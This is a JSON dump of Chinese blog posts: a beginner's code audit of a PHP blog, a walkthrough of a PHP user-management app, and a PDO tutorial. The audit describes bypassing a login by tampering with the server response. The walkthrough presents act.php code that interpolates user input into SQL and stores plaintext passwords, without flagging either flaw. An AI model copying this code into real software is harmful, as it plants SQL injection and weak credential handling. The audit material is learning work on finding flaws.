本来还想写另一个漏洞的，可惜无法绕过，实属能力有限~ ~","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"PHP原生程序之博客分析","slug":"PHP原生程序之博客分析","date":"2018-03-07T00:29:47.000Z","updated":"2019-12-25T00:30:31.439Z","comments":true,"path":"2018/03/07/PHP原生程序之博客分析/","link":"","permalink":"http://yoursite.com/2018/03/07/PHP%E5%8E%9F%E7%94%9F%E7%A8%8B%E5%BA%8F%E4%B9%8B%E5%8D%9A%E5%AE%A2%E5%88%86%E6%9E%90/","excerpt":"","text":"介绍这是一个GITHUB上找到的一个使用原生PHP代码写的一个博客，地址是:https://github.com/qinshuang1998/Tiger-Blog，但是这里有很多功能没有实现（这个作者是不是比我还懒，，，哈哈哈），然后我分析的话只是想让大家明白一下这些功能是如何实现的，还有如果有漏洞的话我也会写出来（因为我是边读边写，然后自己分析一下，但是因为我水平也不是很厉害，所以有很多漏洞也没看出来还请大佬们多多指教），对我们的代码审计有很大的帮助，不多说啦， 源代码讲解First、这里说明一下，我分析的时候，只会写注释，或者截屏然后在旁边标注一下，因为我觉得这样会比较高效一点，所以你们可以下载这个源代码，然后按照我分析的然后再自己看一下，大概也就能明白功能实现原理了，祝你学习愉快。 index.php这个是首页文件( 废话，我也知道 )~ 首先看第三行和第四行：1require('./inc/conn.php'); // 连接数据库2require('./inc/func.php'); // 引入函数文件(一般都是封装了常用的函数,方便调用) 这个不必多说。 接着到了第七行：1$url = $_SERVER['REQUEST_URI']; //这个功能我也不知道是干嘛的，我们来输出一下。2var_dump( $url );die; //输出一下$url,并且不然他执行下面的代码 这个是用于输出除了域名外的路径。 第8行：1$url = parse_url($url); // parse_url将路径放在了数组的path，将?后面的参数放在了数组的query2var_dump( $url );die; // 如果上面字体描述的不懂我们再来打印一下。 打印$num：1var_dump( $num );die; 这里为什么是5呢？我也好奇，然后我来到数据库看了一下。 这个5就是article表的数量 16-23行1if(@$_GET['page'])&#123;2 // 把个个参数都打印一下。3 $pageval=$_GET['page'];4 echo( '$pageval -&gt; '.$pageval .\"&lt;br /&gt;\");5 $page=($pageval-1)*$pagesize;6 echo( '$page -&gt; '.$page .\"&lt;br /&gt;\");7 $page.=',';8 echo( '$page -&gt; '.$page .\"&lt;br /&gt;\");die;9&#125; 看不明白看下去先 然后下面的就基本上是简单的SQL语句了，不讲解了，开始另一个文件 admin功能先讲解后台功能的实现。 登陆功能 在xxx/admin/login.php login.php打开后发现只有一句代码： 1&lt;?php2 3 require('./page/login.html'); // 包含当前的page文件夹里的login.html文件 login.html打开后就是一些前端登陆的表单以及一些样式，然后他是将登陆的数据提交到confirm.php文件，如图： 表单之类的html代码不多讲，这里来分析一下js代码(这里有一个问授权访问漏洞，可以不输入密码直接登陆)： 然后我们来尝试登陆一下，查看result都会返回什么~ 表示登陆成功 表示登陆失败 我们身为白帽子，就是用来打破这些规矩的，输入错误密码的时候我们来抓包获取返回结果并且将result修改为success~ 成功绕过 接下来讲解一下confirm.php文件是如何接受数据的。 confirm.php 上面的$result使用了GetALL函数，我们来看一下他的代码。 1function GetAll($query) &#123;2 3 while($tmp = mysql_fetch_array($query))&#123;4 $result[] = $tmp;5 &#125;6 7 return @$result;8&#125; 查询$query这个sql语句执行后的数据然后循环赋值到$result数组里。 这里的不多将了，具体有注释了，下面没注释的就是一些登陆操作的（我也看不懂） index.php登陆页面分析完了，来分析一下首页页面。 page文件夹里面的都是html文件，也就是展示页面效果的，就不多讲解了。 upload.php 这个文件是后台发布文章的 这里是存在Csrf漏洞的，而且也没有过滤Xss漏洞，所以是存在Xsrf的，但是因为这里他完成了插入功能，但是没有完成展示插入的数据的功能，所以没办法继续讲解了，等作者把功能实现了我再来具体分析。","categories":[{"name":"编程","slug":"编程","permalink":"http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"简单的PHP用户管理分析","slug":"简单的php理分析","date":"2018-01-13T00:27:08.000Z","updated":"2020-01-31T19:50:37.169Z","comments":true,"path":"2018/01/13/简单的php理分析/","link":"","permalink":"http://yoursite.com/2018/01/13/%E7%AE%80%E5%8D%95%E7%9A%84php%E7%90%86%E5%88%86%E6%9E%90/","excerpt":"","text":"项目介绍这是笔者从GITHUB上找的简单PHP程序(用于学习) 这是一个可 增删查 的用户数据管理 数据库连接代码:先介绍一下数据库的表结构： 1&lt;?php2 $pdo &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;data&#39;,&#39;root&#39;,&#39;root&#39;); &#x2F;&#x2F;PDO(PHP访问数据库定义了一个轻量级的、一致性的接口，它提供了一个数据访问抽象层，这样，无论使用什么数据库，都可以通过一致的函数执行查询和获取数据，比如mysql有limit，MSSQL没有limit，pdo会自动转换)3 $pdo-&gt;exec(&#39;set names utf8&#39;); &#x2F;&#x2F;设置编码4 $pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE,PDO::FETCH_ASSOC); &#x2F;&#x2F;设置默认结果集模式为关联数组5 $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION); &#x2F;&#x2F;修改报错模式6?&gt; 其中的PDO是:PDO(PHP访问数据库定义了一个轻量级的、一致性的接口，它提供了一个数据访问抽象层，这样，无论使用什么数据库，都可以通过一致的函数执行查询和获取数据，比如mysql有limit，MSSQL没有limit，pdo会自动转换) PDO好处： 更换数据库时取得极大便利(从A数据库换成其他数据库可以不需要修改查询的代码，因为PDO帮我实现了) 更换数据库时取得极大便利 首页代码：1&lt;?php 2 include 'config.inc.php'; //包含连接数据库的代码34 $len = 10; //每页展现10条数据5 $page = !empty($_GET[\"page\"]) ? $_GET[\"page\"] : 1;//三元表达式，表示如果$_GET['page']为空时，默认值为167 $sqlTotal = \"select count(Id) from t1\"; // SQL语句。意思是查询t1表中的Id字段个数8 $smtTotal = $pdo-&gt;prepare($sqlTotal); //准备要执行的SQL语句并返回一个 PDOStatement 对象(PHP 5 &gt;= 5.1.0, PECL pdo &gt;= 0.1.0)9 echo \"&lt;strong&gt;\\$sqlTotal:&lt;/strong&gt;\";10 print_r($smtTotal);11 echo \"&lt;br /&gt;\";1213 echo \"&lt;strong&gt;execute():&lt;/strong&gt;\";14 print_r($smtTotal-&gt;execute());15 $tot = $smtTotal-&gt;fetchColumn(); //总记录数16 echo \"&lt;br /&gt;\";1718 echo \"&lt;strong&gt;\\$tot:&lt;/strong&gt;\";19 print_r($tot);20 echo \"&lt;br /&gt;\";2122 $pages = ceil($tot/$len); //总页数23 echo \"&lt;strong&gt;\\$pages:&lt;/strong&gt;\";24 print_r($pages);25 ... ...(省略，先讲解一下这段代码的用法) 可以看看我写的PDO的（博客里找） 首页的代码我统统写了注释： 更改用户数据代码：1&lt;?php23/* 4 思路:先获取对应的数据，然后返回到输入框，如果我们选择提交，表单就会发送的数据就会更改到数据库里，实现更改内容5*/6 7 &lt;?php8include 'config.inc.php';9$Id = $_GET[\"Id\"]; //获取GET请求过来的Id值1011$sql = \"select * from t1 where Id=?\"; //SQL语句的查询12$smt = $pdo-&gt;prepare($sql); //给SQL语句做标记13$smt-&gt;bindValue(1,$Id); //想成是给上面的?改成$Id变量的值14$smt-&gt;execute(); //执行SQL语句1516$row = $smt-&gt;fetch(); //接收SQL语句查询到的结果1718?&gt;19&lt;!DOCTYPE html&gt;20&lt;html&gt;21&lt;head&gt;22 &lt;title&gt;update&lt;/title&gt;23 &lt;meta charset=\"utf-8\"&gt;24&lt;/head&gt;25&lt;script type=\"text/javascript\" src=\"bower_components/jquery/dist/jquery.min.js\"&gt;&lt;/script&gt;26&lt;script type=\"text/javascript\" src=\"bower_components/bootstrap/dist/js/bootstrap.min.js\"&gt;&lt;/script&gt;27&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"bower_components/bootstrap/dist/css/bootstrap.min.css\"&gt;28&lt;body&gt;29&lt;div class=\"container\"&gt;30 &lt;h1 class=\"page-header\"&gt;31 &lt;a href=\"index.php\" class=\"btn btn-warning\"&gt;查看用户&lt;/a&gt;32 &lt;a href=\"\" class=\"btn btn-primary\"&gt;修改用户&lt;/a&gt;33 &lt;/h1&gt;34 &lt;form action=\"act.php?act=update&amp;Id=&lt;?php echo $Id;?&gt;\" method=\"post\"&gt; &lt;!-- act页面实现的修改功能，这里只需要传入要修改的Id值就可以更改此Id中对应的数据 --&gt;35 &lt;div class=\"form-group\"&gt;36 &lt;label&gt;新用户名:&lt;/label&gt;37 &lt;input type=\"text\" class=\"form-control\" name=\"Name\" value=&lt;?php echo \"&#123;$row['Name']&#125;\";//把查询到的数据的Name返回到输入框中，这样子我们就可以实现修改功能 ?&gt;38 &gt;39 &lt;/div&gt;40 &lt;div class=\"form-group\"&gt;41 &lt;label&gt;新密码:&lt;/label&gt;42 &lt;input type=\"text\" class=\"form-control\" name=\"Pwd\" value=43 &lt;?php echo \"&#123;$row['Pwd']&#125;\"; //同上?&gt;44 &gt;45 &lt;/div&gt;46 &lt;div class=\"form-group\"&gt;47 &lt;input type=\"submit\" class=\"btn btn-primary\"&gt;48 &lt;input type=\"reset\" class=\"btn btn-danger\"&gt;49 &lt;/div&gt;50 &lt;/form&gt;51&lt;/div&gt;52&lt;/body&gt;53&lt;/html&gt; 插入数据代码：1&lt;!DOCTYPE html&gt;2&lt;html&gt;3&lt;head&gt;4 &lt;title&gt;add&lt;/title&gt;5 &lt;meta charset=\"utf-8\"&gt;6&lt;/head&gt;7&lt;script type=\"text/javascript\" src=\"bower_components/jquery/dist/jquery.min.js\"&gt;&lt;/script&gt;8&lt;script type=\"text/javascript\" src=\"bower_components/bootstrap/dist/js/bootstrap.min.js\"&gt;&lt;/script&gt;9&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"bower_components/bootstrap/dist/css/bootstrap.min.css\"&gt;10&lt;body&gt;11 &lt;div class=\"container\"&gt;12 &lt;h1 class=\"page-header\"&gt;13 &lt;a href=\"index.php\" class=\"btn btn-warning\"&gt;查看用户&lt;/a&gt;14 &lt;a href=\"\" class=\"btn btn-primary\"&gt;添加用户&lt;/a&gt;15 &lt;/h1&gt;16 &lt;form action=\"act.php?act=insert\" method=\"post\"&gt; &lt;!-- act.php页面实现了插入功能，所以这里我们只需要把内容提交到act.php就可以完成插入内容 --&gt;17 &lt;div class=\"form-group\"&gt;18 &lt;label&gt;用户名:&lt;/label&gt;19 &lt;input type=\"text\" class=\"form-control\" name=\"Name\"&gt;20 &lt;/div&gt;21 &lt;div class=\"form-group\"&gt;22 &lt;label&gt;密码:&lt;/label&gt;23 &lt;input type=\"text\" class=\"form-control\" name=\"Pwd\"&gt;24 &lt;/div&gt;25 &lt;div class=\"form-group\"&gt;26 &lt;input type=\"submit\" class=\"btn btn-primary\"&gt;27 &lt;input type=\"reset\" class=\"btn btn-danger\"&gt;28 &lt;/div&gt;29 &lt;/form&gt;30 &lt;/div&gt;31&lt;/body&gt;32&lt;/html&gt; 删除功能代码:删除页面代码也在首页(index.php)里实现的一般我们删除操作是需要十分谨慎的，因为数据一旦删除是无法恢复的，那么如果用户不小心点到了按钮，我们就应该提醒他是否要删除。 可以看到这里有一个class是delete，然后看到下面有一段提醒是否执行删除的JS代码： 最后我们看看act.php的代码：1&lt;?php 2 include 'config.inc.php'; //包含PDO链接数据库代码34 $act = $_GET[\"act\"]; //获取GET请求过来的act值，来实现增、删、改。56 if($act == 'delete')&#123; //如果是选择删除7 $Id = $_GET[\"Id\"]; //获取GET请求过来的ID8 $sql = \"delete from t1 where Id=?\"; //这是SQL语句的删除9 $smt = $pdo-&gt;prepare($sql); //给SQL语句做标记10 $smt-&gt;bindValue(1,$Id); //绑定一个值到用作预处理的 SQL 语句中的对应命名占位符或问号占位符11 if($smt-&gt;execute())&#123; //判断是否执行成功，如果执行成功返回的是112 echo \"&lt;script&gt;location='index.php'&lt;/script&gt;\"; //执行成功就跳转到首页(index.php)13 &#125;14 &#125;15 16 if($act == 'insert')&#123; //如果是选择插入17 $Name = $_POST[\"Name\"]; //获取POST请求的Name值18 $Pwd = $_POST[\"Pwd\"]; //获取POST请求的Pwd值19 $sql = \"insert into t1(Name,Pwd) values('&#123;$Name&#125;','&#123;$Pwd&#125;')\"; //这是SQL语句的插入20 $smt = $pdo-&gt;prepare($sql); //给SQL语句做标记21 if($smt-&gt;execute())&#123; //判断是否执行成功22 echo \"&lt;script&gt;location='index.php'&lt;/script&gt;\"; //执行成功就跳转到首页(index.php)23 &#125;24&#125;25 /*如果act=update和id=x，那么就执行修改的SQL语句，修改条件(where)是Id=x*/26 if($act == 'update')&#123; //如果是更改27 $Id = $_GET[\"Id\"]; //获取GET请求的Id值28 $Name = $_POST[\"Name\"]; //获取POST的Name值29 $Pwd = $_POST[\"Pwd\"]; //获取POST请求的Pwd值30 $sql = \"update t1 set Name='&#123;$Name&#125;',Pwd='&#123;$Pwd&#125;' where Id=&#123;$Id&#125;\"; //这是SQL语句的更改31 $smt = $pdo-&gt;prepare($sql); //给SQL语句做标记32 if($smt-&gt;execute())&#123; //判断是否执行成功33 echo \"&lt;script&gt;location='index.php'&lt;/script&gt;\"; //如果执行成功就跳转到首页(index.php)34 &#125;35 &#125;3637 38 ?&gt;","categories":[{"name":"编程","slug":"编程","permalink":"http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"开发","slug":"开发","permalink":"http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"}]},{"title":"PDO讲解","slug":"PDO讲解","date":"2018-01-11T00:27:08.000Z","updated":"2020-01-31T19:48:37.528Z","comments":true,"path":"2018/01/11/PDO讲解/","link":"","permalink":"http://yoursite.com/2018/01/11/PDO%E8%AE%B2%E8%A7%A3/","excerpt":"","text":"使用PDO写数据库交互是可以防止SQL注入的 因为没有输入密码 所以执行错误，打印了catch语句里的内容 exec():返回SQL语句执行后受影响的行数 就是这样: 所以一般增删改都用exec()，这样子我们就可以很清楚的知道是否执行成功，如果exec()返回的结果为0，那么这肯定是没成功执行(增删改)的。 query():返回SQL语句执行后放回的数据 先看看数据库里都有什么数据： 1&lt;?php2 &#x2F;&#x2F; ... ...(其他省略，主要看sql语句和query的用法)3 $sqlTotal &#x3D; &quot;select * from t1&quot;;4 $s &#x3D; $smtTotal &#x3D; $pdo-&gt;query($sqlTotal); 5 foreach ($s as $key)&#123;6 print_r($key);7 &#125;8 &#x2F;&#x2F; ... ...9?&gt; 页面上返回的结果: 所以，一般是用来查询的都是用query()，这样我们就可以看到查询到的结果了。 预处理：1&lt;?php2 &#x2F;*这样可以防SQL注入，DVWA的impossible级别也是这样写的*&#x2F;3 $pdo &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;blog&#39;,&#39;root&#39;,&#39;root&#39;); 4 $pdo-&gt;exec(&#39;set names utf8&#39;); &#x2F;&#x2F;设置编码5 $pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE,PDO::FETCH_ASSOC); &#x2F;&#x2F;设置默认结果集模式为关联数组6 $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION); &#x2F;&#x2F;修改报错模式7 8 $sql_query &#x3D; &quot;select * from users where id&#x3D;(:id)&quot;;9 $pre2 &#x3D; $pdo -&gt; prepare($sql_query); &#x2F;&#x2F;准备要执行的SQL语句并返回一个 PDOStatement 对象10 $pre2 -&gt; bindParam(&#39;:id&#39;,$id,PDO::PARAM_INT); &#x2F;&#x2F;绑定参数，想成是把:id的值替换成$id变量里的值11 $id &#x3D; $_GET[&#39;id&#39;]; &#x2F;&#x2F;获取GET请求过来的ID值12 $pre2 -&gt; execute(); &#x2F;&#x2F;执行这个SQL语句13 $row &#x3D; $pre2 -&gt; fetch(); &#x2F;&#x2F;fetch()是返回执行结果(无论怎么查询，最多只能返回一条数据)14 print_r($row); &#x2F;&#x2F;打印查询的结果1516?&gt; 结果: 也可以这样的方式：这样子是有好处的，比如表单提交过来的数据就是一个数组，我们可以通过直接传递数组，方便许多。 DVWA里impossible级别的SQL注入测试代码： 1&lt;?php23if( isset( $_GET[ &#39;Submit&#39; ] ) ) &#123;4 &#x2F;&#x2F; Check Anti-CSRF token5 checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );67 &#x2F;&#x2F; Get input8 $id &#x3D; $_GET[ &#39;id&#39; ];910 &#x2F;&#x2F; Was a number entered?11 if(is_numeric( $id )) &#123;12 &#x2F;&#x2F; Check the database13 $data &#x3D; $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id &#x3D; (:id) LIMIT 1;&#39; );14 $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT );15 $data-&gt;execute();16 $row &#x3D; $data-&gt;fetch();1718 &#x2F;&#x2F; Make sure only 1 result is returned19 if( $data-&gt;rowCount() &#x3D;&#x3D; 1 ) &#123;20 &#x2F;&#x2F; Get values21 $first &#x3D; $row[ &#39;first_name&#39; ];22 $last &#x3D; $row[ &#39;last_name&#39; ];2324 &#x2F;&#x2F; Feedback for end user25 echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;;26 &#125;27 &#125;28&#125;2930&#x2F;&#x2F; Generate Anti-CSRF token31generateSessionToken(); &#x2F;&#x2F; 这个是DVWA里的防止CSRF的，可以不用管3233?&gt; 上面的fetch()只返回一条数据，我们可以用fetchALL来返回多条数据 1&lt;?php 23 &#x2F;&#x2F;$sql_query &#x3D; &quot;select * from users where id&#x3D;(:id)&quot;;4 $sql_query &#x3D; &quot;select * from users where id&gt;(:id)&quot;;56 $pre2 &#x3D; $pdo -&gt; prepare($sql_query); &#x2F;&#x2F;准备要执行的SQL语句并返回一个 PDOStatement 对象7 $pre2 -&gt; bindParam(&#39;:id&#39;,$id,PDO::PARAM_INT); &#x2F;&#x2F;绑定参数，想成是把:id的值替换成$id变量里的值8 $id &#x3D; $_GET[&#39;id&#39;]; &#x2F;&#x2F;获取GET请求过来的ID值9 $pre2 -&gt; execute(); &#x2F;&#x2F;执行这个SQL语句10 $row &#x3D; $pre2 -&gt; fetchALL(); &#x2F;&#x2F;fetch()是返回执行结果11 foreach ($row as $key)&#123;12 print_r($key);13 echo &quot;&lt;br&gt;&quot;;14 &#125;1516?&gt; 结果: 事物处理：比如我们去银行汇款的时候，由于某些问题，收款人未收到金额，这个时候汇款人肯定会找银行解决这个问题的，那么久需要用到事物处理了，将用户汇过去的钱还原到数据库里 首先我创建了一个表，里面有one和two用户，他们的存款都有1000: 我们先开启事物处理start transaction;： 然后这个时候当one用户想给two用户转100元的时候，出现了问题：这里one用户的钱没汇到two账户里，却仍然扣除了100元，那么银行知道了事情的真实性，肯定会去处理的，这个时候我们就要用到rollback了，可以回轨(悔棋~) fetchColumn():从结果集中的下一行获取第一列 1&lt;?php23 $sql_query &#x3D; &quot;select * from users where id&gt;(:id)&quot;;4 5 $pre2 &#x3D; $pdo -&gt; prepare($sql_query); &#x2F;&#x2F;准备要执行的SQL语句并返回一个 PDOStatement 对象6 $pre2 -&gt; bindParam(&#39;:id&#39;,$id,PDO::PARAM_INT); &#x2F;&#x2F;绑定参数，想成是把:id的值替换成$id变量里的值7 $id &#x3D; $_GET[&#39;id&#39;]; &#x2F;&#x2F;获取GET请求过来的ID值8 $pre2 -&gt; execute(); &#x2F;&#x2F;执行这个SQL语句9 print_r($pre2 -&gt; fetchColumn());10 echo &quot;&lt;br &#x2F;&gt;&quot;;11 print_r($pre2 -&gt; fetchColumn());12 echo &quot;&lt;br &#x2F;&gt;&quot;;13 14 foreach ($row as $key)&#123;15 print_r($key);16 echo &quot;&lt;br&gt;&quot;;17 &#125;18 19?&gt; 返回的结果： 对比数据库里的数据来看: 我们可以看到这个fetchColumn()就是返回数据库里的第一列的数据，这里的第一列是Id，而且我打印了2次，所以对应的输出为7、1，这个结果相当于$row[‘id’]","categories":[{"name":"编程","slug":"编程","permalink":"http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"开发","slug":"开发","permalink":"http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"}]}]}